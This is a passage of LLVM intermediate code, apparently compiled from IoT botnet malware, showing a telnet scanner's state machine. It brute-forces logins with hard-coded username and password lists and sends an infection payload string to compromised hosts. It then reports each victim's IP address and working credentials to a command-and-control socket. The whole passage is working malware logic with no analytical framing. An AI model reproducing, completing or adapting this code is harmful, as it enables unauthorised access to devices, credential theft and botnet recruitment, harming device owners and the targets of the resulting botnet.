  %276 = call i32 @readUntil(i32 %270, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %272, i32 1024, i32 %275)
  %277 = icmp eq i32 %276, 0
  br i1 %277, label %282, label %278

; <label>:278:                                    ; preds = %268
  store i32 0, i32* %262, align 4
  store i16 0, i16* %273, align 16
  %279 = load i8*, i8** %271, align 8
  %280 = call i8* @strstr(i8* %279, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #15
  %281 = icmp ne i8* %280, null
  %.sink = select i1 %281, i8 5, i8 7
  store i8 %.sink, i8* %40, align 8
  call void @llvm.memset.p0i8.i64(i8* %279, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:282:                                    ; preds = %268
  %283 = load i32, i32* %269, align 16
  %284 = load i8*, i8** %271, align 8
  %285 = load i16, i16* %273, align 16
  %286 = zext i16 %285 to i32
  %287 = call i32 @readUntil(i32 %283, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %284, i32 1024, i32 %286)
  %288 = icmp eq i32 %287, 0
  br i1 %288, label %293, label %289

; <label>:289:                                    ; preds = %282
  store i32 0, i32* %262, align 4
  store i16 0, i16* %273, align 16
  %290 = load i8*, i8** %271, align 8
  %291 = call i8* @strstr(i8* %290, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0)) #15
  %292 = icmp ne i8* %291, null
  %.sink1 = select i1 %292, i8 5, i8 7
  store i8 %.sink1, i8* %40, align 8
  call void @llvm.memset.p0i8.i64(i8* %290, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:293:                                    ; preds = %282
  %294 = load i8*, i8** %271, align 8
  %295 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %296 = icmp eq i8* %295, null
  br i1 %296, label %301, label %297

; <label>:297:                                    ; preds = %293
  %298 = load i32, i32* %269, align 16
  %299 = call i32 @sclose(i32 %298)
  store i8 0, i8* %40, align 8
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %300, align 1
  br label %729

; <label>:301:                                    ; preds = %293
  %302 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %303 = icmp eq i8* %302, null
  br i1 %303, label %308, label %304

; <label>:304:                                    ; preds = %301
  %305 = load i32, i32* %269, align 16
  %306 = call i32 @sclose(i32 %305)
  store i8 0, i8* %40, align 8
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %307, align 1
  br label %729

; <label>:308:                                    ; preds = %301
  %309 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %310 = icmp eq i8* %309, null
  br i1 %310, label %315, label %311

; <label>:311:                                    ; preds = %308
  %312 = load i32, i32* %269, align 16
  %313 = call i32 @sclose(i32 %312)
  store i8 0, i8* %40, align 8
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %314, align 1
  br label %729

; <label>:315:                                    ; preds = %308
  %316 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %317 = icmp eq i8* %316, null
  br i1 %317, label %322, label %318

; <label>:318:                                    ; preds = %315
  %319 = load i32, i32* %269, align 16
  %320 = call i32 @sclose(i32 %319)
  store i8 0, i8* %40, align 8
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %321, align 1
  br label %729

; <label>:322:                                    ; preds = %315
  %323 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %324 = icmp eq i8* %323, null
  br i1 %324, label %329, label %325

; <label>:325:                                    ; preds = %322
  %326 = load i32, i32* %269, align 16
  %327 = call i32 @sclose(i32 %326)
  store i8 0, i8* %40, align 8
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %328, align 1
  br label %729

; <label>:329:                                    ; preds = %322
  %330 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %331 = icmp eq i8* %330, null
  br i1 %331, label %336, label %332

; <label>:332:                                    ; preds = %329
  %333 = load i32, i32* %269, align 16
  %334 = call i32 @sclose(i32 %333)
  store i8 0, i8* %40, align 8
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %335, align 1
  br label %729

; <label>:336:                                    ; preds = %329
  %337 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %338 = icmp eq i8* %337, null
  br i1 %338, label %343, label %339

; <label>:339:                                    ; preds = %336
  %340 = load i32, i32* %269, align 16
  %341 = call i32 @sclose(i32 %340)
  store i8 0, i8* %40, align 8
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %342, align 1
  br label %729

; <label>:343:                                    ; preds = %336
  %344 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %345 = icmp eq i8* %344, null
  br i1 %345, label %350, label %346

; <label>:346:                                    ; preds = %343
  %347 = load i32, i32* %269, align 16
  %348 = call i32 @sclose(i32 %347)
  store i8 0, i8* %40, align 8
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %349, align 1
  br label %729

; <label>:350:                                    ; preds = %343
  %351 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %352 = icmp eq i8* %351, null
  br i1 %352, label %357, label %353

; <label>:353:                                    ; preds = %350
  %354 = load i32, i32* %269, align 16
  %355 = call i32 @sclose(i32 %354)
  store i8 0, i8* %40, align 8
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %356, align 1
  br label %729

; <label>:357:                                    ; preds = %350
  %358 = call i64 @strlen(i8* %294) #15
  %359 = trunc i64 %358 to i16
  store i16 %359, i16* %273, align 16
  %360 = load i32, i32* %262, align 4
  %361 = add i32 %360, 10
  %362 = zext i32 %361 to i64
  %363 = call i64 @time(i64* null) #3
  %364 = icmp slt i64 %362, %363
  br i1 %364, label %365, label %729

; <label>:365:                                    ; preds = %357
  %366 = load i32, i32* %269, align 16
  %367 = call i32 @sclose(i32 %366)
  store i8 0, i8* %40, align 8
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %368, align 1
  br label %729

; <label>:369:                                    ; preds = %.lr.ph
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %371 = load i32, i32* %370, align 16
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %373 = load i8, i8* %372, align 1
  %374 = zext i8 %373 to i64
  %375 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %374
  %376 = load i8*, i8** %375, align 8
  %377 = call i64 @strlen(i8* %376) #15
  %378 = call i64 @send(i32 %371, i8* %376, i64 %377, i32 16384) #3
  %379 = icmp slt i64 %378, 0
  %380 = load i32, i32* %370, align 16
  br i1 %379, label %381, label %384

; <label>:381:                                    ; preds = %369
  %382 = call i32 @sclose(i32 %380)
  store i8 0, i8* %40, align 8
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %383, align 1
  br label %729

; <label>:384:                                    ; preds = %369
  %385 = call i64 @send(i32 %380, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %386 = icmp slt i64 %385, 0
  br i1 %386, label %387, label %391

; <label>:387:                                    ; preds = %384
  %388 = load i32, i32* %370, align 16
  %389 = call i32 @sclose(i32 %388)
  store i8 0, i8* %40, align 8
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %390, align 1
  br label %729

; <label>:391:                                    ; preds = %384
  store i8 6, i8* %40, align 8
  br label %729

; <label>:392:                                    ; preds = %.lr.ph
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %394 = load i32, i32* %393, align 4
  %395 = icmp eq i32 %394, 0
  br i1 %395, label %396, label %399

; <label>:396:                                    ; preds = %392
  %397 = call i64 @time(i64* null) #3
  %398 = trunc i64 %397 to i32
  store i32 %398, i32* %393, align 4
  br label %399

; <label>:399:                                    ; preds = %396, %392
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %401 = load i32, i32* %400, align 16
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %403 = load i8*, i8** %402, align 8
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %405 = load i16, i16* %404, align 16
  %406 = zext i16 %405 to i32
  %407 = call i32 @readUntil(i32 %401, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %403, i32 1024, i32 %406)
  %408 = icmp eq i32 %407, 0
  br i1 %408, label %426, label %409

; <label>:409:                                    ; preds = %399
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %410 = load i8*, i8** %402, align 8
  %411 = call i8* @strstr(i8* %410, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %412 = icmp eq i8* %411, null
  br i1 %412, label %417, label %413

; <label>:413:                                    ; preds = %409
  call void @llvm.memset.p0i8.i64(i8* %410, i8 0, i64 1024, i32 1, i1 false)
  %414 = load i32, i32* %400, align 16
  %415 = call i32 @sclose(i32 %414)
  store i8 0, i8* %40, align 8
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %416, align 1
  br label %729

; <label>:417:                                    ; preds = %409
  %418 = call i32 @matchPrompt(i8* %410)
  %419 = icmp eq i32 %418, 0
  br i1 %419, label %420, label %424

; <label>:420:                                    ; preds = %417
  call void @llvm.memset.p0i8.i64(i8* %410, i8 0, i64 1024, i32 1, i1 false)
  %421 = load i32, i32* %400, align 16
  %422 = call i32 @sclose(i32 %421)
  store i8 0, i8* %40, align 8
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %423, align 1
  br label %729

; <label>:424:                                    ; preds = %417
  store i8 7, i8* %40, align 8
  %425 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %425, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:426:                                    ; preds = %399
  %427 = load i32, i32* %400, align 16
  %428 = load i8*, i8** %402, align 8
  %429 = load i16, i16* %404, align 16
  %430 = zext i16 %429 to i32
  %431 = call i32 @readUntil(i32 %427, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %428, i32 1024, i32 %430)
  %432 = icmp eq i32 %431, 0
  br i1 %432, label %450, label %433

; <label>:433:                                    ; preds = %426
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %434 = load i8*, i8** %402, align 8
  %435 = call i8* @strstr(i8* %434, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %436 = icmp eq i8* %435, null
  br i1 %436, label %441, label %437

; <label>:437:                                    ; preds = %433
  call void @llvm.memset.p0i8.i64(i8* %434, i8 0, i64 1024, i32 1, i1 false)
  %438 = load i32, i32* %400, align 16
  %439 = call i32 @sclose(i32 %438)
  store i8 0, i8* %40, align 8
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %440, align 1
  br label %729

; <label>:441:                                    ; preds = %433
  %442 = call i32 @matchPrompt(i8* %434)
  %443 = icmp eq i32 %442, 0
  br i1 %443, label %444, label %448

; <label>:444:                                    ; preds = %441
  call void @llvm.memset.p0i8.i64(i8* %434, i8 0, i64 1024, i32 1, i1 false)
  %445 = load i32, i32* %400, align 16
  %446 = call i32 @sclose(i32 %445)
  store i8 0, i8* %40, align 8
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %447, align 1
  br label %729

; <label>:448:                                    ; preds = %441
  store i8 7, i8* %40, align 8
  %449 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %449, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:450:                                    ; preds = %426
  %451 = load i32, i32* %400, align 16
  %452 = load i8*, i8** %402, align 8
  %453 = load i16, i16* %404, align 16
  %454 = zext i16 %453 to i32
  %455 = call i32 @readUntil(i32 %451, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %452, i32 1024, i32 %454)
  %456 = icmp eq i32 %455, 0
  br i1 %456, label %467, label %457

; <label>:457:                                    ; preds = %450
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %458 = load i8*, i8** %402, align 8
  %459 = call i8* @strstr(i8* %458, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %460 = icmp eq i8* %459, null
  br i1 %460, label %465, label %461

; <label>:461:                                    ; preds = %457
  call void @llvm.memset.p0i8.i64(i8* %458, i8 0, i64 1024, i32 1, i1 false)
  %462 = load i32, i32* %400, align 16
  %463 = call i32 @sclose(i32 %462)
  store i8 0, i8* %40, align 8
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %464, align 1
  br label %729

; <label>:465:                                    ; preds = %457
  store i8 7, i8* %40, align 8
  %466 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %466, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:467:                                    ; preds = %450
  %468 = load i32, i32* %400, align 16
  %469 = load i8*, i8** %402, align 8
  %470 = load i16, i16* %404, align 16
  %471 = zext i16 %470 to i32
  %472 = call i32 @readUntil(i32 %468, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %469, i32 1024, i32 %471)
  %473 = icmp eq i32 %472, 0
  br i1 %473, label %484, label %474

; <label>:474:                                    ; preds = %467
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %475 = load i8*, i8** %402, align 8
  %476 = call i8* @strstr(i8* %475, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %477 = icmp eq i8* %476, null
  br i1 %477, label %482, label %478

; <label>:478:                                    ; preds = %474
  call void @llvm.memset.p0i8.i64(i8* %475, i8 0, i64 1024, i32 1, i1 false)
  %479 = load i32, i32* %400, align 16
  %480 = call i32 @sclose(i32 %479)
  store i8 0, i8* %40, align 8
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %481, align 1
  br label %729

; <label>:482:                                    ; preds = %474
  store i8 7, i8* %40, align 8
  %483 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %483, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:484:                                    ; preds = %467
  %485 = load i32, i32* %400, align 16
  %486 = load i8*, i8** %402, align 8
  %487 = load i16, i16* %404, align 16
  %488 = zext i16 %487 to i32
  %489 = call i32 @readUntil(i32 %485, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %486, i32 1024, i32 %488)
  %490 = icmp eq i32 %489, 0
  br i1 %490, label %501, label %491

; <label>:491:                                    ; preds = %484
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %492 = load i8*, i8** %402, align 8
  %493 = call i8* @strstr(i8* %492, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %494 = icmp eq i8* %493, null
  br i1 %494, label %499, label %495

; <label>:495:                                    ; preds = %491
  call void @llvm.memset.p0i8.i64(i8* %492, i8 0, i64 1024, i32 1, i1 false)
  %496 = load i32, i32* %400, align 16
  %497 = call i32 @sclose(i32 %496)
  store i8 0, i8* %40, align 8
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %498, align 1
  br label %729

; <label>:499:                                    ; preds = %491
  store i8 7, i8* %40, align 8
  %500 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %500, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:501:                                    ; preds = %484
  %502 = load i32, i32* %400, align 16
  %503 = load i8*, i8** %402, align 8
  %504 = load i16, i16* %404, align 16
  %505 = zext i16 %504 to i32
  %506 = call i32 @readUntil(i32 %502, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %503, i32 1024, i32 %505)
  %507 = icmp eq i32 %506, 0
  br i1 %507, label %518, label %508

; <label>:508:                                    ; preds = %501
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %509 = load i8*, i8** %402, align 8
  %510 = call i8* @strstr(i8* %509, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %511 = icmp eq i8* %510, null
  br i1 %511, label %516, label %512

; <label>:512:                                    ; preds = %508
  call void @llvm.memset.p0i8.i64(i8* %509, i8 0, i64 1024, i32 1, i1 false)
  %513 = load i32, i32* %400, align 16
  %514 = call i32 @sclose(i32 %513)
  store i8 0, i8* %40, align 8
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %515, align 1
  br label %729

; <label>:516:                                    ; preds = %508
  store i8 7, i8* %40, align 8
  %517 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %517, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:518:                                    ; preds = %501
  %519 = load i32, i32* %400, align 16
  %520 = load i8*, i8** %402, align 8
  %521 = load i16, i16* %404, align 16
  %522 = zext i16 %521 to i32
  %523 = call i32 @readUntil(i32 %519, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %520, i32 1024, i32 %522)
  %524 = icmp eq i32 %523, 0
  br i1 %524, label %535, label %525

; <label>:525:                                    ; preds = %518
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %526 = load i8*, i8** %402, align 8
  %527 = call i8* @strstr(i8* %526, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %528 = icmp eq i8* %527, null
  br i1 %528, label %533, label %529

; <label>:529:                                    ; preds = %525
  call void @llvm.memset.p0i8.i64(i8* %526, i8 0, i64 1024, i32 1, i1 false)
  %530 = load i32, i32* %400, align 16
  %531 = call i32 @sclose(i32 %530)
  store i8 0, i8* %40, align 8
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %532, align 1
  br label %729

; <label>:533:                                    ; preds = %525
  store i8 7, i8* %40, align 8
  %534 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %534, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:535:                                    ; preds = %518
  %536 = load i32, i32* %400, align 16
  %537 = load i8*, i8** %402, align 8
  %538 = load i16, i16* %404, align 16
  %539 = zext i16 %538 to i32
  %540 = call i32 @readUntil(i32 %536, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %537, i32 1024, i32 %539)
  %541 = icmp eq i32 %540, 0
  br i1 %541, label %552, label %542

; <label>:542:                                    ; preds = %535
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %543 = load i8*, i8** %402, align 8
  %544 = call i8* @strstr(i8* %543, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %545 = icmp eq i8* %544, null
  br i1 %545, label %550, label %546

; <label>:546:                                    ; preds = %542
  call void @llvm.memset.p0i8.i64(i8* %543, i8 0, i64 1024, i32 1, i1 false)
  %547 = load i32, i32* %400, align 16
  %548 = call i32 @sclose(i32 %547)
  store i8 0, i8* %40, align 8
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %549, align 1
  br label %729

; <label>:550:                                    ; preds = %542
  store i8 7, i8* %40, align 8
  %551 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %551, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:552:                                    ; preds = %535
  %553 = load i32, i32* %400, align 16
  %554 = load i8*, i8** %402, align 8
  %555 = load i16, i16* %404, align 16
  %556 = zext i16 %555 to i32
  %557 = call i32 @readUntil(i32 %553, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %554, i32 1024, i32 %556)
  %558 = icmp eq i32 %557, 0
  br i1 %558, label %569, label %559

; <label>:559:                                    ; preds = %552
  store i32 0, i32* %393, align 4
  store i16 0, i16* %404, align 16
  %560 = load i8*, i8** %402, align 8
  %561 = call i8* @strstr(i8* %560, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %562 = icmp eq i8* %561, null
  br i1 %562, label %567, label %563

; <label>:563:                                    ; preds = %559
  call void @llvm.memset.p0i8.i64(i8* %560, i8 0, i64 1024, i32 1, i1 false)
  %564 = load i32, i32* %400, align 16
  %565 = call i32 @sclose(i32 %564)
  store i8 0, i8* %40, align 8
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %566, align 1
  br label %729

; <label>:567:                                    ; preds = %559
  store i8 7, i8* %40, align 8
  %568 = load i8*, i8** %402, align 8
  call void @llvm.memset.p0i8.i64(i8* %568, i8 0, i64 1024, i32 1, i1 false)
  br label %729

; <label>:569:                                    ; preds = %552
  %570 = load i8*, i8** %402, align 8
  %571 = call i64 @strlen(i8* %570) #15
  %572 = trunc i64 %571 to i16
  store i16 %572, i16* %404, align 16
  %573 = load i32, i32* %393, align 4
  %574 = add i32 %573, 10
  %575 = zext i32 %574 to i64
  %576 = call i64 @time(i64* null) #3
  %577 = icmp slt i64 %575, %576
  br i1 %577, label %578, label %729

; <label>:578:                                    ; preds = %569
  %579 = load i32, i32* %400, align 16
  %580 = call i32 @sclose(i32 %579)
  store i8 0, i8* %40, align 8
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %581, align 1
  br label %729

; <label>:582:                                    ; preds = %.lr.ph
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %584 = load i32, i32* %583, align 16
  %585 = call i64 @send(i32 %584, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0), i64 4, i32 16384) #3
  %586 = icmp slt i64 %585, 0
  br i1 %586, label %587, label %591

; <label>:587:                                    ; preds = %582
  %588 = load i32, i32* %583, align 16
  %589 = call i32 @sclose(i32 %588)
  store i8 0, i8* %40, align 8
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %590, align 1
  br label %729

; <label>:591:                                    ; preds = %582
  store i8 8, i8* %40, align 8
  br label %729

; <label>:592:                                    ; preds = %.lr.ph
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %594 = load i32, i32* %593, align 16
  %595 = call i64 @send(i32 %594, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i64 0, i64 0), i64 9, i32 16384) #3
  %596 = icmp slt i64 %595, 0
  br i1 %596, label %597, label %601

; <label>:597:                                    ; preds = %592
  %598 = load i32, i32* %593, align 16
  %599 = call i32 @sclose(i32 %598)
  store i8 0, i8* %40, align 8
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %600, align 1
  br label %729

; <label>:601:                                    ; preds = %592
  store i8 9, i8* %40, align 8
  br label %729

; <label>:602:                                    ; preds = %.lr.ph
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %604 = load i32, i32* %603, align 16
  %605 = call i64 @send(i32 %604, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %606 = icmp slt i64 %605, 0
  br i1 %606, label %607, label %611

; <label>:607:                                    ; preds = %602
  %608 = load i32, i32* %603, align 16
  %609 = call i32 @sclose(i32 %608)
  store i8 0, i8* %40, align 8
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %610, align 1
  br label %729

; <label>:611:                                    ; preds = %602
  %612 = load i32, i32* @mainCommSock, align 4
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %614 = load i32, i32* %613, align 4
  %615 = call i8* @inet_ntoa(i32 %614) #3
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %617 = load i8, i8* %616, align 2
  %618 = zext i8 %617 to i64
  %619 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %618
  %620 = load i8*, i8** %619, align 8
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %622 = load i8, i8* %621, align 1
  %623 = zext i8 %622 to i64
  %624 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %623
  %625 = load i8*, i8** %624, align 8
  %626 = call i32 (i32, i8*, ...) @sockprintf(i32 %612, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %615, i8* %620, i8* %625)
  store i8 10, i8* %40, align 8
  br label %729

; <label>:627:                                    ; preds = %.lr.ph
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %629 = load i32, i32* %628, align 4
  %630 = icmp eq i32 %629, 0
  br i1 %630, label %631, label %634

; <label>:631:                                    ; preds = %627
  %632 = call i64 @time(i64* null) #3
  %633 = trunc i64 %632 to i32
  store i32 %633, i32* %628, align 4
  br label %634

; <label>:634:                                    ; preds = %631, %627
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %636 = load i32, i32* %635, align 16
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %638 = load i8*, i8** %637, align 8
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %640 = load i16, i16* %639, align 16
  %641 = zext i16 %640 to i32
  %642 = call i32 @readUntil(i32 %636, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %638, i32 1024, i32 %641)
  %643 = icmp eq i32 %642, 0
  br i1 %643, label %662, label %644

; <label>:644:                                    ; preds = %634
  store i32 0, i32* %628, align 4
  store i16 0, i16* %639, align 16
  %645 = load i32, i32* %635, align 16
  %646 = call i64 @send(i32 %645, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %647 = load i32, i32* @mainCommSock, align 4
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %649 = load i32, i32* %648, align 4
  %650 = call i8* @inet_ntoa(i32 %649) #3
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %652 = load i8, i8* %651, align 2
  %653 = zext i8 %652 to i64
  %654 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %653
  %655 = load i8*, i8** %654, align 8
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %657 = load i8, i8* %656, align 1
  %658 = zext i8 %657 to i64
  %659 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %658
  %660 = load i8*, i8** %659, align 8
  %661 = call i32 (i32, i8*, ...) @sockprintf(i32 %647, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %650, i8* %655, i8* %660)
  br label %729

; <label>:662:                                    ; preds = %634
  %663 = load i32, i32* %635, align 16
  %664 = load i8*, i8** %637, align 8
  %665 = load i16, i16* %639, align 16
  %666 = zext i16 %665 to i32
